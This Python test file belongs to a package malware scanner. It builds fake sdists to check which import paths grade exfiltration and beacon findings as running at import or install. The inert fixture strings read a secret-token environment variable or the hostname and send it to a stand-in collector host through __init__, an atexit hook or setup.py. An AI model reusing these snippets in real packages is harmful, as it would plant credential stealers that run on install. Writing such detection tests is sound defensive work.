"""`MALWARE.EXFIL.001` and `MALWARE.EXFIL.BEACON.001` at import are read against what `import pkg`
runs, not what `python -m pkg` runs (reviews/pypi-98/19, class X). `pkg/__main__.py` executes when a
person starts the program; a body reached only from its load statements is on request, like a console
script. Every other way in still runs at import or install: from `__init__`, from a runner handed the
function at load, at module level of a module both import, and from an install hook. Inert fixtures:
nothing is run, the hosts are `.invalid`."""

from __future__ import annotations

import io
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

EXFIL = "MALWARE.EXFIL.001"
BEACON = "MALWARE.EXFIL.BEACON.001"


class MainReachKit:
    SEND = (
        "import os\nimport urllib.request\n"
        "def chat():\n"
        "    key = os.environ['ACME_SECRET_TOKEN']\n"
        "    urllib.request.urlopen('https://collector.invalid/', data=key.encode())\n"
    )
    REPORT = (
        "import socket\nimport urllib.request\n"
        "def chat():\n"
        "    host = socket.gethostname()\n"
        "    urllib.request.urlopen('https://collector.invalid/?h=' + host)\n"
    )
    CLI = "from acme.net import chat\ndef main():\n    chat()\n"
    MAIN = "from acme.cli import main\nmain()\n"

    @staticmethod
    def sdist(tmp_path: Path, files: dict[str, str], setup: str | None = None) -> Path:
        root = "acme-1.0.0"
        members = {
            f"{root}/PKG-INFO": "Metadata-Version: 2.1\nName: acme\nVersion: 1.0.0\n",
            f"{root}/setup.py": setup or "from setuptools import setup\nsetup(name='acme')\n",
            f"{root}/acme/__init__.py": "",
            **{f"{root}/{k}": v for k, v in files.items()},
        }
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name, text in members.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        path = tmp_path / f"{root}.tar.gz"
        path.write_bytes(buf.getvalue())
        return path

    @staticmethod
    def rules(target: Path) -> dict[str, list[list[str]]]:
        config = Config.default().with_overrides(use_cache=False, offline=True)
        out: dict[str, list[list[str]]] = {}
        for f in Scanner(config).scan(target).findings:
            out.setdefault(f.rule_id, []).append(list(f.explanation.escalations))
        return out

    @classmethod
    def program(cls, send: str = SEND) -> dict[str, str]:
        return {"acme/net.py": send, "acme/cli.py": cls.CLI, "acme/__main__.py": cls.MAIN}


class TestStartedAsAProgram:
    """Reached only from `__main__.py`: not graded as import."""

    def test_a_credential_sent_from_a_function_only_main_reaches(self, tmp_path: Path) -> None:
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, MainReachKit.program()))
        assert EXFIL not in found, found

    def test_the_machine_reported_from_a_function_only_main_reaches(self, tmp_path: Path) -> None:
        files = MainReachKit.program(MainReachKit.REPORT)
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, files))
        assert BEACON not in found, found


class TestEveryOtherWayInStillRunsAtImport:
    """The stealer twins: the same body, reached another way as well."""

    def test_reached_from_init_too(self, tmp_path: Path) -> None:
        files = {
            **MainReachKit.program(),
            "acme/__init__.py": "from acme.net import chat\nchat()\n",
        }
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, files))
        assert EXFIL in found, found

    def test_handed_to_a_runner_at_load_too(self, tmp_path: Path) -> None:
        files = {
            **MainReachKit.program(),
            "acme/__init__.py": "import atexit\nfrom acme.net import chat\natexit.register(chat)\n",
        }
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, files))
        assert EXFIL in found, found

    def test_module_level_in_a_module_both_import(self, tmp_path: Path) -> None:
        body = (
            "import os\nimport urllib.request\n"
            "urllib.request.urlopen('https://collector.invalid/',"
            " data=os.environ['ACME_SECRET_TOKEN'].encode())\n"
        )
        files = {
            "acme/net.py": body,
            "acme/__main__.py": "import acme.net\n",
            "acme/__init__.py": "import acme.net\n",
        }
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, files))
        assert EXFIL in found, found

    def test_reached_from_an_install_hook_too_keeps_the_install_grade(self, tmp_path: Path) -> None:
        setup = (
            "from setuptools import setup\nfrom acme.cli import main\nmain()\nsetup(name='acme')\n"
        )
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, MainReachKit.program(), setup))
        assert EXFIL in found, found
        assert any(any("install or build" in e for e in esc) for esc in found[EXFIL]), found

    def test_the_machine_reported_from_init_too(self, tmp_path: Path) -> None:
        files = {
            **MainReachKit.program(MainReachKit.REPORT),
            "acme/__init__.py": "from acme.net import chat\nchat()\n",
        }
        found = MainReachKit.rules(MainReachKit.sdist(tmp_path, files))
        assert BEACON in found, found
